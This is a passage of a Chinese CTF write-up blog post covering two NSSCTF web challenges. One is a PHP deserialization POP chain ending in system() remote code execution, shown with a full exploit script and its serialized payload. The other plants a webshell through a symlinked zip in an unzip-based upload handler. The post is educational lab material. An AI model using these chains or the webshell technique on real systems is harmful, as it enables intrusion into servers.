+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;无法计算MD5哈希，因为文件参数无效: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;文件未找到&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;method&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">method_exists</span>($this, $_POST[<span style="color:#e6db74">&#39;method&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $method <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;method&#39;</span>];
+</span></span><span style="display:flex;"><span>            $var <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;var&#39;</span>]) <span style="color:#f92672">?</span> $_POST[<span style="color:#e6db74">&#39;var&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span>$method($var); 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">responseData</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FunctionInvoker</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $functionName; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $functionArguments; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>($name, $arg){
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>($name)) {
+</span></span><span style="display:flex;"><span>            $name($arg[<span style="color:#ae81ff">0</span>]); 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>只有<code>ApplicationContext</code>类中有<code>__destruct</code>方法，这条链从入口开始找比较方便，<code>__destruct</code>方法中调用了<code>strtolower</code>函数，将<code>contextName</code>成员置为<code>FileManager</code>类的实例就能继续执行<code>__toString</code>方法，将method置为<code>performWriteOperation</code>，就能进入<code>performWriteOperation</code>方法，只需要再将<code>targetObject</code>置为<code>ContentProcessor</code>类的实例再将<code>var</code>置为processedContent，尝试访问private成员就会调用<code>ContentProcessor</code>类的<code>__get</code>方法，最后就是命令执行的部分，将<code>callbackFunction</code>置为system，尝试访问<code>FunctionInvoker</code>类中不存在的方法就会调用<code>__call</code>方法，只需再传入<code>cmd</code>为要执行的命令就能实现RCE，完整的链子：</p>
+<pre tabindex="0"><code>ApplicationContext.__destruct -&gt; FileManager.__toString -&gt; FileManager.performWriteOperation -&gt; ContentProcessor.__get -&gt; FunctionInvoker.__call
+</code></pre><p>exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ApplicationContext</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $contextName; 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ContentProcessor</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $processedContent; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $callbackFunction;   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>(){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">processedContent</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FunctionInvoker</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileManager</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $targetFile; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $responseData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;default_response&#39;</span>; 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FunctionInvoker</span>{
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ApplicationContext</span>();
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileManager</span>();
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">contextName</span> <span style="color:#f92672">=</span> $b;   <span style="color:#75715e">// 触发__toString   method=performWriteOperation&amp;var=processedContent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ContentProcessor</span>();
+</span></span><span style="display:flex;"><span>$c<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callbackFunction</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;system&#34;</span>;
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">targetFile</span> <span style="color:#f92672">=</span> $c; <span style="color:#75715e">// 触发__get   cmd=whoami
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($a)));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>生成的序列化字符串：</p>
+<pre tabindex="0"><code>O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D%7D
+</code></pre><p><img alt="alt" loading="lazy" src="/images/NSSCTF4th/2.png"></p>
+<hr>
+<h2 id="ez_upload">ez_upload<a hidden class="anchor" aria-hidden="true" href="#ez_upload">#</a></h2>
+<p>比赛过程中给了一条hint：<code>ez_upload: php -S</code></p>
+<p>PHP&lt;=7.4.21存在远程源码泄露漏洞：</p>
+<p><img alt="alt" loading="lazy" src="/images/NSSCTF4th/3.png"></p>
+<p>index.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$finfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">finfo_open</span>(<span style="color:#a6e22e">FILEINFO_MIME_TYPE</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">finfo_file</span>($finfo, $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;application/zip&#39;</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;cd /tmp &amp;&amp; unzip -o &#39;</span> <span style="color:#f92672">.</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>拿到源码的时候比赛已经快结束了，赛后仔细分析一遍，先看<code>finfo_open</code>函数和参数<code>FILEINFO_MIME_TYPE</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">finfo_open</span>(<span style="color:#a6e22e">int</span> $flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#f92672">?</span><span style="color:#a6e22e">string</span> $magic_database <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">finfo</span><span style="color:#f92672">|</span><span style="color:#66d9ef">false</span> { }
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">param</span> <span style="color:#a6e22e">int</span> $flags <span style="color:#a6e22e">—</span> <span style="color:#a6e22e">One</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">disjunction</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">more</span> <span style="color:#a6e22e">Fileinfo</span> <span style="color:#a6e22e">constants</span><span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#a6e22e">param</span> <span style="color:#a6e22e">string</span><span style="color:#f92672">|</span><span style="color:#66d9ef">null</span> $magic_database
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FILEINFO_MIME_TYPE</span> (<span style="color:#a6e22e">int</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Return</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">mime</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">.</span> 
+</span></span></code></pre></div><p><code>finfo_open</code>函数打开一个魔数数据库并且返回它的资源句柄，指向底层系统资源的引用，本地环境var_dump看一下具体是什么内容：</p>
+<pre tabindex="0"><code>resource(2) of type (file_info) 
+</code></pre><p>再看一下全局数据<code>$FILE</code>：</p>
+<pre tabindex="0"><code>$_FILES[&#34;file&#34;][&#34;name&#34;] - 上传文件的名称
+$_FILES[&#34;file&#34;][&#34;type&#34;] - 上传文件的类型
+$_FILES[&#34;file&#34;][&#34;size&#34;] - 上传文件的大小，以字节计
+$_FILES[&#34;file&#34;][&#34;tmp_name&#34;] - 存储在服务器的文件的临时副本的名称 // 临时目录位置由php.ini决定 echo ini_get(&#39;upload_tmp_dir&#39;);
+$_FILES[&#34;file&#34;][&#34;error&#34;] - 由文件上传导致的错误代码
+</code></pre><p>简单来说<code>finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === 'application/zip'</code>用于判断文件类型是否为zip类型，严格限制了只能上传zip类型的文件</p>
+<p>php有个临时文件的机制，对于上传的文件都会临时在<code>upload_tmp_dir</code>目录下保存一个副本<code>phpXXXXXX.tmp</code> (在windows下有tmp后缀，linux没有)，在php程序正常结束时被删除，但是如果php程序崩溃或非正常结束，那么临时文件就会被保存下来</p>
+<p>本题利用的是linux的软链接特性，类似windows上的快捷方式，创建软链接会有一个类似文件夹的文件产生，里面连通被指向的目录，需要题目环境执行解压操作才能实现任意路径写入webshell</p>
+<p><code>ln -s</code>创建软链接文件link，指向/var/www/html：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /var/www/html link
+</span></span></code></pre></div><p>将link软链接打包成zip压缩包：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip --symlinks link1.zip link
+</span></span></code></pre></div><p>在link中放入木马文件shell.php，将link以及shell.php一并打包为zip压缩包：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip -r link2.zip link
+</span></span></code></pre></div><p>再依次上传两个zip压缩包，先上传link1.zip，在/tmp目录下创建一个指向/var/www/html的软链接，再上传link2.zip，其中的shell.php会被直接解压到软链接指向的/var/www/html目录下，实现任意路径webshell的写入，最后蚁剑连接就能拿到shell，flag在根目录下：NSSCTF{y0u_ar3_50ft_l1nk_m4st3r!!!!}</p>
+<p>参考资料：</p>
+<p><a href="https://cn-sec.com/archives/1634720.html">https://cn-sec.com/archives/1634720.html</a></p>
+<p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p>
+<p><a href="https://0ran9e.fun/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/">https://0ran9e.fun/2024/09/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2023ciscn-Unzip/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
